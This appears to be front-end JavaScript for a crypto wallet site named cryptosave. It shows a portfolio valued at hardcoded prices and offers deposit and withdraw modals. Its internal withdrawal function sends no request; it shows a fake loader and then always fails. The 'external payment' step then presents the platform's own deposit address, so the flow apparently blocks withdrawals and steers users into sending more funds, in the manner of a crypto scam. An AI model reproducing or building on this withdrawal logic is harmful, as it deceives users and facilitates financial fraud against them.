const API_URL = (window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1")
    ? "http://localhost:5000"
    : "https://cryptosave-1.onrender.com";

let currentTotal = 0;
let depositAddress = "";
let hidden = localStorage.getItem("hideBalance") === "true";

/* =========================
   INIT
========================= */
document.addEventListener("DOMContentLoaded", () => {
    const nav = document.getElementById("nav-wallet");
    if (nav) nav.classList.add("nav-active");

    loadWallet();
    setupHamburger();
    setupToggleBalance();
});

/* =========================
   WALLET DATA
========================= */
async function loadWallet() {
    try {
        const res = await fetch(`${API_URL}/portfolio`);
        const data = await res.json();

        const assetsDiv = document.getElementById("walletAssets");
        const countEl = document.getElementById("assetCount");

        if (!assetsDiv) return;

        assetsDiv.innerHTML = "";

        let total = 0;
        let count = 0;

        const prices = {
            bitcoin: 65000,
            ethereum: 3500,
            usdt: 1,
            solana: 150
        };

        const logos = {
            bitcoin: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png",
            ethereum: "https://assets.coingecko.com/coins/images/279/large/ethereum.png",
            usdt: "https://assets.coingecko.com/coins/images/325/large/Tether.png",
            solana: "https://assets.coingecko.com/coins/images/4128/large/solana.png"
        };

        if (data.assets) {
            Object.keys(data.assets).forEach(key => {
                const amount = Number(data.assets[key]) || 0;

                if (amount <= 0) return;

                const value = amount * (prices[key] || 1);

                total += value;
                count++;

                const el = document.createElement("div");
                el.className = "wallet-row";

                el.innerHTML = `
                    <div class="wallet-left">
                        <img src="${logos[key] || ''}" />
                        <div>
                            <h4>${key.toUpperCase()}</h4>
                            <small>${amount}</small>
                        </div>
                    </div>
                    <div class="wallet-right">
                        <strong>$${value.toFixed(2)}</strong>
                    </div>
                `;

                assetsDiv.appendChild(el);
            });
        }

        currentTotal = total;
        updateBalanceUI();

        if (countEl) {
            countEl.innerText = count;
        }

    } catch (err) {
        console.log("Wallet error:", err);
    }
}

/* =========================
   LOAD DEPOSIT ADDRESS
========================= */
async function loadDepositAddress() {
    try {
        const res = await fetch(`${API_URL}/api/deposit-address`);
        const data = await res.json();

        const address = data.address || "No address set";

        const dashboardEl = document.getElementById("depositWalletAddress");
        const walletEl = document.getElementById("externalPaymentAddress");

        if (dashboardEl) {
            dashboardEl.value = address;
            dashboardEl.innerText = address;
        }

        if (walletEl) {
            walletEl.value = address;
            walletEl.innerText = address;
        }

        depositAddress = address;

    } catch (err) {
        console.log("Deposit address load failed:", err);
    }
}

/* =========================
   COPY FUNCTIONS
========================= */
function copyDepositAddress() {

    const input = document.getElementById("depositWalletAddress");

    if (!input) {
        alert("Input not found");
        return;
    }

    const value = input.value;

    if (!value) {
        alert("No address found");
        return;
    }

    navigator.clipboard.writeText(value)
    .then(() => {
        alert("Copied successfully");
    })
    .catch((err) => {
        console.log(err);

        input.select();
        input.setSelectionRange(0, 99999);

        document.execCommand("copy");

        alert("Copied successfully");
    });
}

function copyExternalPaymentAddress() {

    const input = document.getElementById("externalPaymentAddress");

    if (!input) {
        alert("Address field not found");
        return;
    }

    const value = input.value;

    if (!value || value === "Loading...") {
        alert("No address available");
        return;
    }

    navigator.clipboard.writeText(value)
        .then(() => {
            alert("Copied successfully");
        })
        .catch(() => {

            input.select();
            input.setSelectionRange(0, 99999);

            document.execCommand("copy");

            alert("Copied successfully");
        });
}

/* =========================
   BALANCE UI
========================= */
function updateBalanceUI() {
    const totalEl = document.getElementById("walletTotal");

    if (!totalEl) return;

    totalEl.innerText = hidden ? "****" : `$${currentTotal.toFixed(2)}`;
}

/* =========================
   TOGGLE
========================= */
function setupToggleBalance() {
    const toggleBtn = document.getElementById("toggleBalance");

    if (!toggleBtn) return;

    toggleBtn.addEventListener("click", () => {
        hidden = !hidden;
        localStorage.setItem("hideBalance", hidden);
        updateBalanceUI();
    });
}

/* =========================
   HAMBURGER
========================= */
function setupHamburger() {
    const hamburger = document.getElementById("hamburger");
    const navLinks = document.getElementById("navLinks");

    if (hamburger && navLinks) {
        hamburger.addEventListener("click", () => {
            navLinks.classList.toggle("active");
        });
    }
}

/* =========================
   MODALS
========================= */
function openDeposit() {
    const modal = document.getElementById("depositModal");

    if (modal) {
        modal.style.display = "flex";
    }

    loadDepositAddress();
}

function closeDeposit() {
    const modal = document.getElementById("depositModal");

    if (modal) {
        modal.style.display = "none";
    }
}

function openWithdraw() {
    const modal = document.getElementById("withdrawModal");

    if (modal) {
        modal.style.display = "flex";
    }
}

function closeWithdraw() {
    const modal = document.getElementById("withdrawModal");

    if (modal) {
        modal.style.display = "none";
    }
}

/* =========================
   WITHDRAW FLOW
========================= */
function openWithdrawAccess() {
    const modal = document.getElementById("withdrawAccessModal");

    if (modal) {
        modal.style.display = "flex";
    }
}

function closeWithdrawAccess() {
    const modal = document.getElementById("withdrawAccessModal");

    if (modal) {
        modal.style.display = "none";
    }
}

/* INTERNAL PAY */
function payInternal() {
    showLoader();

    setTimeout(() => {
        hideLoader();
        closeWithdrawAccess();

        alert("Unable to verify beneficiary withdrawal path");
    }, 1500);
}

/* EXTERNAL PAYMENT */
async function openExternalPayment() {
    showLoader();

    await loadDepositAddress();

    setTimeout(() => {
        hideLoader();

        const modal = document.getElementById("externalPaymentModal");

        if (modal) {
            modal.style.display = "flex";
        }

    }, 800);
}

function closeExternalPayment() {
    const modal = document.getElementById("externalPaymentModal");

    if (modal) {
        modal.style.display = "none";
    }
}

/* =========================
   LOADER
========================= */
function showLoader() {
    const loader = document.getElementById("globalLoader");

    if (loader) {
        loader.style.display = "flex";
    }
}

function hideLoader() {
    const loader = document.getElementById("globalLoader");

    if (loader) {
        loader.style.display = "none";
    }
}

/* =========================
   TOAST
========================= */
function showToast(message) {
    const toast = document.createElement("div");

    toast.className = "toast";
    toast.innerText = message;

    document.body.appendChild(toast);

    setTimeout(() => {
        toast.classList.add("show");
    }, 100);

    setTimeout(() => {
        toast.classList.remove("show");
        toast.remove();
    }, 2000);
}

/* =========================
   LOGOUT
========================= */
function logout() {
    localStorage.clear();
    window.location.href = "index.html";
}